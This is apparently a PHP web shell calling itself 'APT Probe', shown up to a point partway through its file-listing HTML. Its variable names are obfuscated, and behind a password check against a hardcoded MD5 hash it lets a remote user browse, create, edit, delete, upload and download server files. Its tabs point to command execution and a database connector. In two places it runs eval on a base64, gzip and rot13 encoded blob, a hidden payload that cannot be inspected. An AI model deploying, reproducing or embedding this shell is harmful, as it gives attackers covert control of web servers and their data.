<?php

${"GLOBALS"}["lucevdorhw"] = "actual_link";
${"GLOBALS"}["pwejlxoyx"] = "contents";
${"GLOBALS"}["ocwbnryyxv"] = "arrContextOptions";
${"GLOBALS"}["xlorhfo"] = "curl";
${"GLOBALS"}["omudkjwkkhh"] = "url";
${"GLOBALS"}["ryekiidmn"] = "context";
${"GLOBALS"}["ztqrgysqx"] = "options";
${"GLOBALS"}["featkcm"] = "link";
${"GLOBALS"}["xxerecbu"] = "deger";
${"GLOBALS"}["hyjgqjfc"] = "currentpath";
${"GLOBALS"}["sukyplhpp"] = "ourlasturl";
${"GLOBALS"}["fvwkaqqo"] = "actual_link2";
${"GLOBALS"}["qclvnee"] = "uplink";
${"GLOBALS"}["twfuwiwkfh"] = "lostjtururururuji";
${"GLOBALS"}["myhsqxv"] = "bvbdvhsvbhsdvf1r1r11gsg";
${"GLOBALS"}["kukkcdct"] = "h2j3h4j23h4j2h3b4fggjndfjn";
${"GLOBALS"}["wurgoo"] = "nbhsdbfhdbshfbsdhbfhsdbh22v23";
${"GLOBALS"}["nihissjo"] = "jlkjalfdjsafjdasfjasjlfjasdljf";
${"GLOBALS"}["nnmchyegsegj"] = "knj23njn4j3n2j4n23j4n234";
${"GLOBALS"}["wpgfkxgimc"] = "kjnab22h2h2hh22hh2";
${"GLOBALS"}["mpsgpniww"] = "bbvbhsvsdvsdvsdvi";
${"GLOBALS"}["kachqzot"] = "vvdsavsdavsdavsxc221123";
${"GLOBALS"}["aoithig"] = "s1xcascascaasascsa";
${"GLOBALS"}["trnkuuwcnbje"] = "weh2h2h22g2g2g2g2g2gg2";
${"GLOBALS"}["pbcxqvwu"] = "bhvbsahbvhasdvhbsadhvbhsadvs";
${"GLOBALS"}["xbhtlhbhbm"] = "ljhshshshshshssss";
${"GLOBALS"}["ummiderb"] = "bshdbhcbsdcsdcsd";
${"GLOBALS"}["vjaueym"] = "lsgjasnbcabscjabscascas";
$bowjkuxkjbmv = "bhvbsahbvhasdvhbsadhvbhsadvs";
${"GLOBALS"}["fnfxvxwz"] = "sdfsdhh1hh1bdsbdbvbsdbv";
${"GLOBALS"}["dfmgnyreii"] = "value";
${"GLOBALS"}["inixxyyl"] = "row";
$hpfksnkdjfc = "currentpath";
${"GLOBALS"}["tsergpidqx"] = "dbConn";
${"GLOBALS"}["nodpspgdcdz"] = "ourlasturl";
${"GLOBALS"}["sygmlddf"] = "dbId";
${"GLOBALS"}["voojvsq"] = "result";
${"GLOBALS"}["vjiwpnlmqsx"] = "fileList";
${"GLOBALS"}["qcljgslni"] = "dirDate";
${"GLOBALS"}["ohsjkzqn"] = "dirList";
${"GLOBALS"}["ohxgkcq"] = "i";
${"GLOBALS"}["htqyccawisw"] = "actual_link";
${"GLOBALS"}["lqnhrgxmgi"] = "page";
${"GLOBALS"}["jtggdpdubxt"] = "file";
$mdbflmghvm = "actual_link";
${"GLOBALS"}["deiumextu"] = "path";
${"GLOBALS"}["doyohi"] = "listArr";
${"GLOBALS"}["xnymkjqq"] = "handler";
${"GLOBALS"}["fupdnkjco"] = "inputPw";
${"GLOBALS"}["apsnebbc"] = "filePath";
${"GLOBALS"}["bjghpg"] = "dirPath";
${"GLOBALS"}["norrctyi"] = "fp";
${"GLOBALS"}["fbocqkztdlk"] = "path";
${"GLOBALS"}["ilrbalxknot"] = "tempPath";
${"GLOBALS"}["nutsnruh"] = "accessFlag";
${"GLOBALS"}["vkquicffugb"] = "path";
${"GLOBALS"}["tykeagihnxg"] = "bshdbhcbsdcsdcsd";
${"GLOBALS"}["cryqwdnlto"] = "query";
${"GLOBALS"}["bfntorx"] = "weh2h2h22g2g2g2g2g2gg2";
${"GLOBALS"}["jrklfdwree"] = "dbName";
$lpqzhrlnoyp = "currentpath";
${"GLOBALS"}["ivpswcxxcwkv"] = "dbPw";
${"GLOBALS"}["hukwjvtvq"] = "dbHost";
${"GLOBALS"}["oykhaiz"] = "fileName";
${"GLOBALS"}["kisivpvxgj"] = "mode";
$rqraskyg = "path";
error_reporting(0);
session_start();
${"GLOBALS"}["ofsghuzcg"] = "actual_link2";
$xmbuwf = "dbId";
${"GLOBALS"}["yvnbml"] = "inputPw";
header("Content-Type: text/html; charset=UTF-8");
${${"GLOBALS"}["kisivpvxgj"]} = $_REQUEST["mode"];
$xkwejazppq = "accessPw";
${"GLOBALS"}["wenoxxt"] = "file";
${"GLOBALS"}["qkrehgm"] = "bvbdvhsvbhsdvf1r1r11gsg";
${"GLOBALS"}["fnejtkhxyxq"] = "currentpath";
${"GLOBALS"}["rsoxukx"] = "page";
${$rqraskyg} = $_REQUEST["path"];
${${"GLOBALS"}["rsoxukx"]} = basename($_SERVER["PHP_SELF"]);
${${"GLOBALS"}["oykhaiz"]} = $_GET["fileName"];
${${"GLOBALS"}["hukwjvtvq"]} = $_POST["dbHost"];
${$xmbuwf} = $_POST["dbId"];
${${"GLOBALS"}["ivpswcxxcwkv"]} = $_POST["dbPw"];
${${"GLOBALS"}["jrklfdwree"]} = $_POST["dbName"];
${${"GLOBALS"}["cryqwdnlto"]} = $_POST["query"];
${${"GLOBALS"}["yvnbml"]} = $_POST["inputPw"];
${$xkwejazppq} = "21232f297a57a5a743894a0e4a801fc3";
${${"GLOBALS"}["nutsnruh"]} = $_SESSION["accessFlag"];
$tgubfjap = "page";
${"GLOBALS"}["ewfvtsxucd"] = "path";
if (empty(${${"GLOBALS"}["vkquicffugb"]})) {
    ${"GLOBALS"}["mghbinsl"] = "path";
    ${"GLOBALS"}["hfixiqnjh"] = "tempFileName";
    $qupmekj = "tempFileName";
    ${$qupmekj} = basename(__FILE__);
    $qsbnqv = "path";
    ${${"GLOBALS"}["ilrbalxknot"]} = realpath(__FILE__);
    ${${"GLOBALS"}["fbocqkztdlk"]} = str_replace(${${"GLOBALS"}["hfixiqnjh"]}, "", ${${"GLOBALS"}["ilrbalxknot"]});
    ${${"GLOBALS"}["mghbinsl"]} = str_replace("\\", "/", ${$qsbnqv});
} else {
    $neyyhfhkekia = "path";
    ${${"GLOBALS"}["fbocqkztdlk"]} = realpath(${${"GLOBALS"}["fbocqkztdlk"]}) . "/";
    ${${"GLOBALS"}["fbocqkztdlk"]} = str_replace("\\", "/", ${$neyyhfhkekia});
}
$chckhlwb = "ourlasturl";
if (${${"GLOBALS"}["nutsnruh"]} == "Y") {
    $umfetqebfr = "mode";
    $yedeudcn = "mode";
    $uvivhvwitvr = "mode";
    if (${${"GLOBALS"}["kisivpvxgj"]} == "fileCreate") {
        $pmkfgbvhbcgf = "fileName";
        $skddspdto = "fileName";
        if (empty(${$skddspdto})) {
            echo "<script>alert('Please include file name');history.back(-1);</script>";
            exit;
        }
        $hjhoyzx = "fp";
        ${${"GLOBALS"}["norrctyi"]} = fopen(${${"GLOBALS"}["fbocqkztdlk"]} . ${$pmkfgbvhbcgf}, "w");
        fclose(${$hjhoyzx});
        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
    } else {
        if (${${"GLOBALS"}["kisivpvxgj"]} == "dirCreate") {
            $cjutwnnowv = "fileName";
            if (empty(${${"GLOBALS"}["oykhaiz"]})) {
                echo "<script>alert('Please include file name');history.back(-1);</script>";
                exit;
            }
            ${${"GLOBALS"}["bjghpg"]} = ${${"GLOBALS"}["fbocqkztdlk"]} . ${$cjutwnnowv};
            ${"GLOBALS"}["aglhluwlqnf"] = "dirPath";
            if (is_dir(${${"GLOBALS"}["aglhluwlqnf"]})) {
                echo "<script>alert('Already exist directory');history.back(-1);</script>";
                exit;
            }
            mkdir(${${"GLOBALS"}["bjghpg"]});
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        } else {
            if (${${"GLOBALS"}["kisivpvxgj"]} == "fileModify" && !empty($_POST["fileContents"])) {
                ${"GLOBALS"}["kknryiajepv"] = "fileName";
                ${"GLOBALS"}["ybpyubgvslg"] = "fileContents";
                ${${"GLOBALS"}["apsnebbc"]} = ${${"GLOBALS"}["fbocqkztdlk"]} . ${${"GLOBALS"}["kknryiajepv"]};
                if (!file_exists(${${"GLOBALS"}["apsnebbc"]})) {
                    echo "<script>alert('File not exist');history.back(-1);</script>";
                    exit;
                }
                ${"GLOBALS"}["hoczwgj"] = "fileContents";
                ${${"GLOBALS"}["ybpyubgvslg"]} = $_POST["fileContents"];
                $pncxfppbla = "fileContents";
                ${${"GLOBALS"}["norrctyi"]} = fopen(${${"GLOBALS"}["apsnebbc"]}, "w");
                fputs(${${"GLOBALS"}["norrctyi"]}, ${$pncxfppbla}, strlen(${${"GLOBALS"}["hoczwgj"]}));
                fclose(${${"GLOBALS"}["norrctyi"]});
                echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
            } else {
                if (${$umfetqebfr} == "fileDelete") {
                    ${"GLOBALS"}["tqghqwfm"] = "filePath";
                    $evupudquora = "fileName";
                    ${"GLOBALS"}["dvauvvgigo"] = "fileName";
                    ${"GLOBALS"}["qicblshifrs"] = "path";
                    if (empty(${${"GLOBALS"}["dvauvvgigo"]})) {
                        echo "<script>alert('Please include file name');history.back(-1);</script>";
                        exit;
                    }
                    ${${"GLOBALS"}["tqghqwfm"]} = ${${"GLOBALS"}["qicblshifrs"]} . ${$evupudquora};
                    if (!file_exists(${${"GLOBALS"}["apsnebbc"]})) {
                        echo "<script>alert('File not exist');history.back(-1);</script>";
                        exit;
                    }
                    if (!unlink(${${"GLOBALS"}["apsnebbc"]})) {
                        echo "<script>alert('Failed delete file');history.back(-1);</script>";
                        exit;
                    }
                    echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
                } else {
                    if (${${"GLOBALS"}["kisivpvxgj"]} == "dirDelete") {
                        ${"GLOBALS"}["yrtofro"] = "dirPath";
                        $uocowkpc = "path";
                        if (empty(${${"GLOBALS"}["oykhaiz"]})) {
                            echo "<script>alert('Please include file name');history.back(-1);</script>";
                            exit;
                        }
                        ${${"GLOBALS"}["yrtofro"]} = ${$uocowkpc} . ${${"GLOBALS"}["oykhaiz"]};
                        if (!is_dir(${${"GLOBALS"}["bjghpg"]})) {
                            echo "<script>alert('Directory not exist');history.back(-1);</script>";
                            exit;
                        }
                        if (!rmdir(${${"GLOBALS"}["bjghpg"]})) {
                            echo "<script>alert('Failed delete directory');history.back(-1);</script>";
                            exit;
                        }
                        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
                    } else {
                        if (${$yedeudcn} == "fileDownload") {
                            ${"GLOBALS"}["jkzfkzyffu"] = "filePath";
                            $maokelcyr = "path";
                            ${"GLOBALS"}["wkvfmbxldp"] = "fileName";
                            ${"GLOBALS"}["uiibuybfdoq"] = "filePath";
                            $buwggp = "filePath";
                            if (empty(${${"GLOBALS"}["wkvfmbxldp"]})) {
                                echo "<script>alert('Please include file name');history.back(-1);</script>";
                                exit;
                            }
                            ${${"GLOBALS"}["uiibuybfdoq"]} = ${$maokelcyr} . ${${"GLOBALS"}["oykhaiz"]};
                            if (!file_exists(${${"GLOBALS"}["jkzfkzyffu"]})) {
                                echo "<script>alert('File not exist');history.back(-1);</script>";
                                exit;
                            }
                            header("Content-Type: application/octet-stream");
                            header("Content-Disposition: attachment; fileName=\"{$fileName}\"");
                            header("Content-Transfer-Encoding: bianry");
                            readfile(${$buwggp});
                            exit;
                        } else {
                            if (${$uvivhvwitvr} == "fileUpload" && !empty($_FILES["file"]["tmp_name"])) {
                                ${"GLOBALS"}["vzedpqxuoee"] = "filePath";
                                ${"GLOBALS"}["fvactjsyjir"] = "filePath";
                                ${${"GLOBALS"}["vzedpqxuoee"]} = ${${"GLOBALS"}["fbocqkztdlk"]} . $_FILES["file"]["name"];
                                if (!move_uploaded_file($_FILES["file"]["tmp_name"], ${${"GLOBALS"}["fvactjsyjir"]})) {
                                    echo "<script>alert('Failed file upload');history.back(-1);</script>";
                                    exit;
                                }
                                echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
                            } else {
                                if (${${"GLOBALS"}["kisivpvxgj"]} == "logout") {
                                    unset($_SESSION["accessFlag"]);
                                    session_destroy();
                                    echo "<script>location.href='{$page}'</script>";
                                }
                            }
                        }
                    }
                }
            }
        }
    }
} else {
    ${"GLOBALS"}["xnlcgwbcosfx"] = "mode";
    $ddvddqdsevy = "accessPw";
    if (${${"GLOBALS"}["xnlcgwbcosfx"]} == "login" && ${$ddvddqdsevy} == md5(${${"GLOBALS"}["fupdnkjco"]})) {
        $_SESSION["accessFlag"] = "Y";
        echo "<script>location.href='{$page}'</script>";
        exit;
    }
}
$vsudspwcq = "actual_link";
function getDirList($getPath)
{
    $yggquty = "getPath";
    ${"GLOBALS"}["wcryseye"] = "listArr";
    ${${"GLOBALS"}["wcryseye"]} = array();
    ${${"GLOBALS"}["xnymkjqq"]} = opendir(${$yggquty});
    ${"GLOBALS"}["ncnrqfov"] = "file";
    while (${${"GLOBALS"}["ncnrqfov"]} = readdir(${${"GLOBALS"}["xnymkjqq"]})) {
        ${"GLOBALS"}["njajpimip"] = "getPath";
        $gfjjrcwq = "file";
        if (is_dir(${${"GLOBALS"}["njajpimip"]} . ${$gfjjrcwq}) == "1") {
            ${${"GLOBALS"}["doyohi"]}[] = ${${"GLOBALS"}["jtggdpdubxt"]};
        }
    }
    ${"GLOBALS"}["gdmjktfrhsh"] = "listArr";
    closedir(${${"GLOBALS"}["xnymkjqq"]});
    return ${${"GLOBALS"}["gdmjktfrhsh"]};
}
function getFileList($getPath)
{
    ${"GLOBALS"}["rfxiiitci"] = "getPath";
    ${"GLOBALS"}["dumiejkiki"] = "listArr";
    ${${"GLOBALS"}["dumiejkiki"]} = array();
    ${${"GLOBALS"}["xnymkjqq"]} = opendir(${${"GLOBALS"}["rfxiiitci"]});
    while (${${"GLOBALS"}["jtggdpdubxt"]} = readdir(${${"GLOBALS"}["xnymkjqq"]})) {
        ${"GLOBALS"}["nxtrmqj"] = "getPath";
        if (is_dir(${${"GLOBALS"}["nxtrmqj"]} . ${${"GLOBALS"}["jtggdpdubxt"]}) == "0") {
            ${"GLOBALS"}["ionpmfsw"] = "file";
            ${${"GLOBALS"}["doyohi"]}[] = ${${"GLOBALS"}["ionpmfsw"]};
        }
    }
    closedir(${${"GLOBALS"}["xnymkjqq"]});
    return ${${"GLOBALS"}["doyohi"]};
}
${"GLOBALS"}["wqujjnxoid"] = "page";
echo "\n<!DOCTYPE html>\n<html>\n\t\n\t<head>\n\t\t<title>"; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
echo basename($_SERVER["PHP_SELF"]);
${"GLOBALS"}["hljyryffgdx"] = "path";
echo "</title>\n\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css\">\n\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css\">\n\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js\"></script>\n\n<script>\n\tfunction fileCreate(){\n\t\tvar fileName = frm.createFileName.value;\n\t\tif(!fileName){\n\t\t\talert(\"Insert the file name.\");\n\t\t\treturn;\n\t\t}\n\t\tlocation.href = \"";
${"GLOBALS"}["fvkrypveig"] = "s1xcascascaasascsa";
echo ${${"GLOBALS"}["lqnhrgxmgi"]};
echo "?mode=fileCreate&path=";
$uhdphsdlw = "bshdbhcbsdcsdcsd";
echo ${${"GLOBALS"}["deiumextu"]};
echo "&fileName=\" + fileName;\n\t}\n\n\tfunction dirCreate(){\n\t\tvar fileName = frm.createFileName.value;\n\t\tif(!fileName){\n\t\t\talert(\"Insert the direcory name.\");\n\t\t\treturn;\n\t\t}\n\t\tlocation.href = \"";
echo ${$tgubfjap};
echo "?mode=dirCreate&path=";
echo ${${"GLOBALS"}["hljyryffgdx"]};
echo "&fileName=\" + fileName;\n\t}\n\n\n\tfunction fileModify(fileName){\n\t\tlocation.href = \"";
echo ${${"GLOBALS"}["wqujjnxoid"]};
echo "?mode=fileModify&path=";
echo ${${"GLOBALS"}["fbocqkztdlk"]};
echo "&fileName=\" + fileName;\n\t}\n\n\n\tfunction dirDelete(fileName){\n\t\t\tif(confirm('\\\"'+fileName+'\\\"' + \" directory delete, Are you sure?\") == true)\n\t\t\t{\n\n\t\t\tlocation.href = \"";
echo ${${"GLOBALS"}["lqnhrgxmgi"]};
echo "?mode=dirDelete&path=";
$fsltsocfrf = "lsgjasnbcabscjabscascas";
echo ${${"GLOBALS"}["ewfvtsxucd"]};
echo "&fileName=\" + fileName;\n\t\t\t\t\n\t\t\t}\n\t}\n\n\n\n\tfunction fileDelete(fileName){\n\t\t\tif(confirm('\\\"'+fileName+'\\\"' + \" file delete, Are you sure?\") == true)\n\t\t\t{\n\n\t\t\tlocation.href = \"";
echo ${${"GLOBALS"}["lqnhrgxmgi"]};
${"GLOBALS"}["xrjzhnnnjb"] = "lostjtururururuji";
echo "?mode=fileDelete&path=";
echo ${${"GLOBALS"}["fbocqkztdlk"]};
echo "&fileName=\" + fileName;\n\t\t\t\t\n\t\t\t}\n\t}\n\n\tfunction fileDownload(fileName){\n\n\t\t\tlocation.href = \"";
echo ${${"GLOBALS"}["lqnhrgxmgi"]};
echo "?mode=fileDownload&path=";
echo ${${"GLOBALS"}["fbocqkztdlk"]};
echo "&fileName=\" + fileName;\n\n\t}\n\n\n</script>\n\n\n\t</head>\n\n\n\n\n\n\n\t<body>\n\n\t\t<div class=\"container-fluid\">\n\t\t\t\t <div class=\"row\">\n\t\t\t\t  <div class=\"col-md-3\"></div>\n\n\t\t\t\t  <div class=\"col-md-6\">\n\n\n\t\t\t\t  ";
if (${${"GLOBALS"}["nutsnruh"]} != "Y") {
    ${"GLOBALS"}["hlqdoarskn"] = "page";
    echo "\n\t\t\t\t  \t<h3>Login</h3>\n\n\t\t\t\t  \t<hr>\n\n\n\t\t\t\t\t\t\t<form action=\"";
    echo ${${"GLOBALS"}["hlqdoarskn"]}; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
    echo "?mode=login\" method=\"POST\">\n\n\n\t\t\t\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t\t\t\t  <span class=\"input-group-addon\">Password</span>\n\t\t\t\t\t\t\t\t  <input type=\"password\" class=\"form-control\" placeholder=\"Password Input...\" name=\"inputPw\">\n\n\n\t\t\t\t\t\t\t\t</div>\n\n\t\t\t\t\t\t\t\t<br>\n\n\t\t\t\t\t\t\t \t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">Auth</button></p>\n\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t</form>\n\n\n\t\t\t\t  ";
} else {
    ${"GLOBALS"}["xmnnxyicw"] = "page";
    echo "\n\n\t\t\t\t  \t<h3>APT <small>Probe</small></h3>\n\n\t\t\t\t  \t<hr>\n\n\t\t\t\t\t<ul class=\"nav nav-tabs\">\n\t\t\t\t\t  <li role=\"presentation\" ";
    if (empty(${${"GLOBALS"}["kisivpvxgj"]}) || ${${"GLOBALS"}["kisivpvxgj"]} == "fileBrowser") {
        echo "class=\"active\"";
    }
    ${"GLOBALS"}["wewdwiove"] = "mode";
    ${"GLOBALS"}["wczeyvpj"] = "path";
    echo " ><a href=\"";
    echo ${${"GLOBALS"}["lqnhrgxmgi"]};
    echo "?mode=fileBrowser\">File Browser</a></li>\n\n\t\t\t\t\t  <li role=\"presentation\" ";
    if (${${"GLOBALS"}["wewdwiove"]} == "fileUpload") {
        echo "class=\"active\"";
    }
    echo " ><a href=\"";
    ${"GLOBALS"}["jpsljwjte"] = "mode";
    echo ${${"GLOBALS"}["xmnnxyicw"]};
    ${"GLOBALS"}["cfpudeclhz"] = "mode";
    echo "?mode=fileUpload&path=";
    echo ${${"GLOBALS"}["wczeyvpj"]};
    echo "\">File Upload</a></li>\n\n\t\t\t\t\t  <li role=\"presentation\" ";
    if (${${"GLOBALS"}["jpsljwjte"]} == "command") {
        echo "class=\"active\"";
    }
    echo " ><a href=\"";
    echo ${${"GLOBALS"}["lqnhrgxmgi"]};
    echo "?mode=command\">Command Execution</a></li>\n\n\t\t\t\t\t  <li role=\"presentation\" ";
    if (${${"GLOBALS"}["kisivpvxgj"]} == "db") {
        echo "class=\"active\"";
    }
    echo " ><a href=\"";
    echo ${${"GLOBALS"}["lqnhrgxmgi"]};
    echo "?mode=db\">DB Connector</a></li>\n\n\t\t\t\t\t  <li role=\"presentation\"><a href=\"";
    echo ${${"GLOBALS"}["lqnhrgxmgi"]};
    echo "?mode=logout\">Logout</a></li>\n\n\t\t\t\t\t</ul>\n\n\t\t\t\t\t<br>\n\n\n\n\t\t\t\t\t";
    $dsrgwsqsft = "mode";
    if (empty(${${"GLOBALS"}["kisivpvxgj"]}) || ${${"GLOBALS"}["kisivpvxgj"]} == "fileBrowser") {
        $ajyrsdd = "path";
        ${"GLOBALS"}["pmrrsw"] = "dirList";
        ${"GLOBALS"}["bfbyaxvr"] = "i";
        echo "\t\t\t\t\t<form action=\"";
        $xtimtween = "i";
        echo ${${"GLOBALS"}["lqnhrgxmgi"]};
        $nttumxojbw = "i";
        echo "?mode=fileBrowser\" method=\"GET\">\n\t\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t\t  <span class=\"input-group-addon\">Current Path</span>\n\t\t\t\t\t\t  <input type=\"text\" class=\"form-control\" placeholder=\"Path Input...\" name=\"path\" value=\"";
        $elotshug = "i";
        echo ${$ajyrsdd};
        ${"GLOBALS"}["petcccfrh"] = "dirList";
        echo "\">\n\n\t\t\t\t\t      <span class=\"input-group-btn\">\n\t\t\t\t\t        <button class=\"btn btn-default\" type=\"submit\">Move</button>\n\t\t\t\t\t      </span>\n\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</form>\n\n\n\t\t\t\t\t<hr>\n\n\t\t\t\t\t<div class=\"table-responsive\">\n\n\t\t\t\t\t<table class=\"table table-bordered table-hover\" style=\"table-layout:fixed; word-break: break-all;\">\n\t\t\t\t\t  \t<thead>\n\n\t\t\t\t\t  \t\t<tr class=\"active\">\n\t\t\t\t\t  \t\t\t<th style=\"vertical-align:middle; width:50%\" class=\"text-center\">Name</th>\n\t\t\t\t\t  \t\t\t<th style=\"vertical-align:middle; width:14%\" class=\"text-center\">Type</th>\n\t\t\t\t\t  \t\t\t<th style=\"vertical-align:middle; width:18%\" class=\"text-center\">Date</th>\n\t\t\t\t\t  \t\t\t<th style=\"vertical-align:middle; width:18%\" class=\"text-center\">Action</th>\n\t\t\t\t\t  \t\t</tr>\n\t\t\t\t  \t\t</thead>\n\n\t\t\t\t  \t\t<tbody>\n\n\n\t\t\t\t  \t\t\t\t";
        ${${"GLOBALS"}["pmrrsw"]} = getDirList(${${"GLOBALS"}["fbocqkztdlk"]});
        for (${$elotshug} = 0; ${${"GLOBALS"}["ohxgkcq"]} < count(${${"GLOBALS"}["petcccfrh"]}); ${${"GLOBALS"}["bfbyaxvr"]}++) {
            ${"GLOBALS"}["mgaeznqyv"] = "i";
            if (${${"GLOBALS"}["ohsjkzqn"]}[${${"GLOBALS"}["mgaeznqyv"]}] != ".") {
                $nnlhjrwyyhw = "i";
                $qpsduvrx = "dirList";
                ${"GLOBALS"}["gpcjiva"] = "page";
                $jssmuopfhu = "dirList";
                ${"GLOBALS"}["qxirtjqhfme"] = "dirList";
                ${"GLOBALS"}["vvmmha"] = "dirList";
                ${${"GLOBALS"}["qcljgslni"]} = date("Y-m-d H:i", filemtime(${${"GLOBALS"}["fbocqkztdlk"]} . ${${"GLOBALS"}["vvmmha"]}[${$nnlhjrwyyhw}]));
                $uezxgmvxs = "i";
                ${$jssmuopfhu}[${${"GLOBALS"}["ohxgkcq"]}] = iconv("CP949", "UTF-8", ${${"GLOBALS"}["qxirtjqhfme"]}[${${"GLOBALS"}["ohxgkcq"]}]);
                echo "\n\t\t\t\t  \t\t\t<tr>\n\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-primary\"><b><span class=\"glyphicon glyphicon glyphicon-folder-open\" aria-hidden=\"true\"></span>&nbsp;&nbsp;<a href=\"";
                echo ${${"GLOBALS"}["gpcjiva"]};
                echo "?mode=fileBrowser&path=";
                echo ${${"GLOBALS"}["fbocqkztdlk"]};
                echo ${$qpsduvrx}[${$uezxgmvxs}];
                echo "\">";
                echo ${${"GLOBALS"}["ohsjkzqn"]}[${${"GLOBALS"}["ohxgkcq"]}];
                echo "</a></b></td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\"><kbd style=\"background: GoldenRod\">Directory</kbd></td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\">";
                echo ${${"GLOBALS"}["qcljgslni"]};
                echo "</td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\">\n\t\t\t\t  \t\t\t\t\t\n\t\t\t\t  \t\t\t\t\t";
                if (${${"GLOBALS"}["ohsjkzqn"]}[${${"GLOBALS"}["ohxgkcq"]}] != "..") {
                    $mufmwigit = "i";
                    echo "\n\t\t\t\t\t\t\t\t\t<div class=\"btn-group btn-group-sm\" role=\"group\" aria-label=\"...\">\n\n\t\t\t\t\t\t\t\t\t  <button type=\"button\" title=\"Directory Delete\" onclick=\"dirDelete('";
                    echo ${${"GLOBALS"}["ohsjkzqn"]}[${$mufmwigit}];
                    echo "')\"  class=\"btn btn-danger\"><span class=\"glyphicon glyphicon-trash\n\" aria-hidden=\"true\"></span>\n</button>\n\t\t\t\t\t\t\t\t\t</div>\n\n\t\t\t\t\t\t\t\t\t";
                }
                echo "\n\t\t\t\t  \t\t\t\t</td>\n\n\t\t\t\t  \t\t\t</tr>\n\n\t\t\t\t  \t\t\t";
            }
            echo "\n\t\t\t\t  \t\t\t";
        }
        echo "\n\n\n\n\t\t\t\t  \t\t\t\t";
        ${${"GLOBALS"}["vjiwpnlmqsx"]} = getFileList(${${"GLOBALS"}["fbocqkztdlk"]});
        $wtahvhnpbrif = "i";
        for (${$nttumxojbw} = 0; ${$wtahvhnpbrif} < count(${${"GLOBALS"}["vjiwpnlmqsx"]}); ${$xtimtween}++) {
            ${"GLOBALS"}["tnhsbghdpf"] = "path";
            $fipnomcf = "fileList";
            $nsriwywoxc = "i";
            $zpebxtt = "i";
            ${"GLOBALS"}["yjbudtlm"] = "dirDate";
            $suggwly = "dirDate";
            ${"GLOBALS"}["llgcfwuzv"] = "fileList";
            ${${"GLOBALS"}["yjbudtlm"]} = date("Y-m-d H:i", filemtime(${${"GLOBALS"}["tnhsbghdpf"]} . ${${"GLOBALS"}["vjiwpnlmqsx"]}[${${"GLOBALS"}["ohxgkcq"]}]));
            ${"GLOBALS"}["verfugfbcuz"] = "fileList";
            ${${"GLOBALS"}["vjiwpnlmqsx"]}[${${"GLOBALS"}["ohxgkcq"]}] = iconv("CP949", "UTF-8", ${${"GLOBALS"}["vjiwpnlmqsx"]}[${${"GLOBALS"}["ohxgkcq"]}]);
            $bygkidcmwq = "i";
            echo "\n\t\t\t\t  \t\t\t<tr>\n\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\"><span class=\"glyphicon glyphicon-file\" aria-hidden=\"true\"></span>&nbsp;&nbsp;";
            echo ${$fipnomcf}[${$nsriwywoxc}];
            echo "</td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\"><kbd>File</kbd></td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\">";
            echo ${$suggwly};
            echo "</td>\n\t\t\t\t  \t\t\t\t<td style=\"vertical-align: middle\" class=\"text-center\">\n\t\t\t\t  \t\t\t\t\t\n\n\t\t\t\t\t\t\t\t\t<div class=\"btn-group btn-group-sm\" role=\"group\" aria-label=\"...\">\n\t\t\t\t\t\t\t\t\t  <button type=\"button\" title=\"File Download\" onclick=\"fileDownload('";
            echo ${${"GLOBALS"}["verfugfbcuz"]}[${$bygkidcmwq}];
